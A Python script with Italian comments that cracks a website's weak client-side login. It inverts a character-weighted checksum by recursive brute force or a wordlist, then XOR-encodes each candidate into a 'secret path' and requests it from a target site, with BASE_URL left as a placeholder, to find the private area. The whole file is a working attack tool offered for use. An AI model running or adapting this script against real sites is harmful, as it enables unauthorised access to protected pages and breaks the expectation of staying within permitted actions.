from random import shuffle
import requests
from time import sleep

# PARAMETRI DA MODIFICARE
# codice da craccare
TARGET = 180539
# parte iniziale dell'url della "path segreta" che accede il sito dopo il login
BASE_URL = "www.CHANGEME.com/private/"
# nome del file che contiene la lista di possibili password da provare
WORDLIST = "CHANGEME"

# PARAMETRI INZIALI
# ogni carattere è associato ad un numero pseudo-casuale generato all'inizio
mapping = {'0': 23, '1': 535, '2': 1047, '3': 1559, '4': 2071, '5': 2583, '6': 3095, '7': 3607, '8': 4119, '9': 4631,
           'A': 12, 'B': 21, 'C': 26, 'D': 38, 'E': 53, 'F': 72, 'G': 101, 'H': 139, 'I': 294, 'J': 375, 'K': 584, 'L': 841, 'M': 1164, 'N': 1678, 'O': 2425, 'P': 4989, 'Q': 6478, 'R': 10076, 'S': 14494, 'T': 21785, 'U': 30621, 'V': 69677, 'W': 87452, 'X': 139356, 'Y': 201113, 'Z': 278810,
           'a': 80, 'b': 83, 'c': 93, 'd': 99, 'e': 113, 'f': 131, 'g': 159, 'h': 194, 'i': 346, 'j': 416, 'k': 619, 'l': 861, 'm': 1165, 'n': 1649, 'o': 2256, 'p': 4766, 'q': 6077, 'r': 9554, 's': 13713, 't': 20576, 'u': 28894, 'v': 65661, 'w': 82386, 'x': 131248, 'y': 164801, 'z': 262524}
# lista dei caratteri legali che può avere la password
char_legali = list(mapping.keys())


def genera_codice(password):
    """Somma ogni carattere i-esimo della password con il suo numero associato * i"""
    return sum([(i+1) * mapping[char] for i, char in enumerate(password)])

def encode(password):
    """Un codice alfanumerico che corrisponde alla path del sito che accede all'area riservata"""
    dizionario="0123456789abcdefghijklmnopqrstuvwxyz._~"
    dizionario=dizionario+"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    risultato=""

    for c in password:
        i = dizionario.index(c)
        cipher = i^len(password)
        cipher = dizionario[cipher]
        risultato += cipher

    return risultato

def check_caratteri(stringa):
    """Controlla se la stringa ha solo caratteri legali"""
    for c in stringa:
        if c not in char_legali:
            return False
        
    return True

def bruteforce_puro(codice, password=""):
    """Trova la prima password che combacia con il codice provando tutte le combinazioni ricorsivamente"""
    check = genera_codice(password)
    print(f"check: {password} -> {check}")

    # PASSO BASE
    if check == codice:
        print("PASSWORD TROVATA:", password)
        return True
    elif check > codice:
        return False
        
    # PASSO RICORSIVO (check < codice)
    shuffle(char_legali)
    for c in char_legali:
        if bruteforce_puro(codice, password+c):
            return True

    return False

def bruteforce_wordlist_min_delta(codice, wordlist):
    """Trova la password di una wordlist con il codice più vicino a quello dato in input"""
    top_delta = 99999999
    top_word = ""
    passwords = [line.strip() for line in open(wordlist, "r").readlines()]

    for password in passwords:
        # salta passwords che contengono caratteri illegali
        if not(check_caratteri(password)):
            continue

        check = genera_codice(password)
        delta = abs(codice - check)
        print(f"check: {password} -> {check} ({delta})")

        if delta < top_delta:
            top_delta = delta
            top_word = password

    print("\nTOP:", top_word, top_delta)

def bruteforce_wordlist(codice, wordlist):
    """Trova le password di una wordlist il cui codice combacia con quello preso in input"""
    top_passwords = []
    passwords = [line.strip() for line in open(wordlist, "r").readlines()]

    for password in passwords:
        # salta passwords che contengono caratteri illegali
        if not(check_caratteri(password)):
            continue

        check = genera_codice(password)
        delta = abs(codice - check)
        print(f"check: {password} -> {check} ({delta})")

        if codice == check:
            top_passwords.append(password)

    print("\nTOP")
    print(top_passwords)
    return top_passwords

def check_password_online(password):
    """Controlla online se la password è corretta"""
    enc = encode(password)
    print(f"Check password: {password} ({encode(password)})")

    r = requests.get(f"{BASE_URL}{enc}.html")
    return r.status_code != 404

def check_passlist_online(password_list):
    """Controlla online una lista di passwords"""
    for password in password_list:
        if check_password_online(password):
            print("PASSWORD TROVATA:", password)
            return True

        sleep(1)

    return False


if __name__ == "__main__":
    top_passwords = bruteforce_wordlist(TARGET, WORDLIST)
    check_passlist_online(top_passwords)